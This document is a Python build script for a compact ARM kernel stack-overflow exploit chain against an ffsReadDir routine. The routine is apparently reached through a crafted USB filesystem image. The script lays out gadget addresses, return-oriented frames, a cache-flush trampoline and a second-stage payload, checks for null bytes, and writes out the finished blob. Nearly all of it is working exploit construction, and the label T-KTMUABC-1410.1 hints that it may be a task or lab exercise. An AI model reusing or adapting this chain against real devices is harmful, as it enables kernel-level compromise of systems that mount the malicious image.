#!/usr/bin/env python3
"""Build the compact ffsReadDir stack-overflow chain for T-KTMUABC-1410.1.

Why this exists: the original kand-usb-final.img chain carried a 612-byte second
stage at uniname+1420, so the 2040-byte name copy ran 0x13c bytes past the top
of the 8 KiB kernel stack and wrote into the adjacent task's thread_info.  It
also ran the stage with sp above the stack top, so current_thread_info()
resolved to the wrong stack.  This builder emits a 288-byte stage (UEP patch + p2 stage1 command) that
keeps the whole copy inside the stack and derives sp from the live memcpy r1.

Layout (all addresses are for the shipped uImage, load 0xc0008000):
  DEST   = 0xc00083dc  memcpy destination (36 bytes before CAVE)
  CAVE   = 0xc0008400  copy-window epilogue frame
  STORE  = 0xc0008424  r1-saving gadget frame
  FLUSH  = 0xc0008434  flush-wrapper frame
  STAGE0 = 0xc0008448  28-byte cache-flush trampoline
  FULL   = 0xc0008464  payload

The ffsReadDir epilogue needs (payload byte offsets from uniname):
  +528 r6=DEST  +548 fp=0xc0008424  +552 sp=FAKE  +556 pc=ldmge
The cave blob is injected at payload offset 1420.
"""
import struct, subprocess, sys, os

DEST=0xc00083dc
CAVE=DEST+36
STORE=DEST+72
FLUSH=DEST+88
STAGE0=DEST+108
FULL=DEST+136
FAKE_SP=0xc0008e00
LDMGE=0xc051ad5c
COPYWIN=0xc0100904
MEMCPY=0xc023e740
STOREG=0xc00756f4      # str r1,[r4]; str r3,[r4,#4]; sub sp,fp,#16; ldm sp,{r4,fp,sp,pc}
FLUSHW=0xc001254c      # add r1,r4,#0x1c; mov r0,r4; bl v7_coherent_kern_range; ...
STORE_ADDR=0xc0008d00
HEREDIR=os.path.dirname(os.path.abspath(__file__))

def assemble(src, out):
    asm=os.path.join(HEREDIR,src); obj=os.path.join(HEREDIR,src.replace('.S','.o')); binp=os.path.join(HEREDIR,out)
    subprocess.run(['arm-none-eabi-as','-march=armv7-a',asm,'-o',obj],check=True)
    subprocess.run(['arm-none-eabi-objcopy','-O','binary','-j','.text',obj,binp],check=True)
    return open(binp,'rb').read()

def p32(x): return struct.pack('<I',x & 0xffffffff)
def words(*xs): return b''.join(p32(x) for x in xs)

stage0=assemble('stage0.S','stage0.bin')
payload=assemble('payload.S','payload.bin')
assert len(stage0)==24, len(stage0)
blob_len=136+len(payload)
assert blob_len==288, (blob_len,len(payload))
ldm=words(0x41414141,0x42424242,MEMCPY,0x43434343,blob_len,
          0x44444444,0x45454545,FAKE_SP,COPYWIN)
frame1=words(STORE_ADDR,0x46464646,0x47474747,0x48484848,0x49494949,
             0x4a4a4a4a,STORE+16,FAKE_SP,STOREG)
storef=words(STAGE0,STAGE0,STORE_ADDR,FLUSHW)
flushf=words(FULL,FULL+len(payload),0x4b4b4b4b,STORE_ADDR,STAGE0)
pad=b'\x41'*4
blob=ldm+frame1+storef+flushf+stage0+pad+payload
assert len(blob)==288
zs=[i for i in range(0,len(blob)-1,2) if struct.unpack_from('<H',blob,i)[0]==0]
expected=[18] if (blob_len>>16)==0 else []
assert zs==expected, 'unexpected zero halfwords at %r (expected %r)' % ([hex(x) for x in zs], expected)
assert struct.unpack_from('<I',blob,16)[0]==blob_len
open(os.path.join(HEREDIR,'compact_blob.bin'),'wb').write(blob)
print('compact_blob.bin: %d bytes, copy_len=%d, zero halfword at +%d' % (len(blob),blob_len,zs[0]))
print('ffsReadDir frame: r6=%#x fp=%#x sp=%#x pc=%#x' % (DEST,CAVE+36,FAKE_SP,LDMGE))
print('overflow with SecondaryCount=58: 57*30=%d bytes; stack headroom 1724; margin %d' % (57*30,1724-1710))
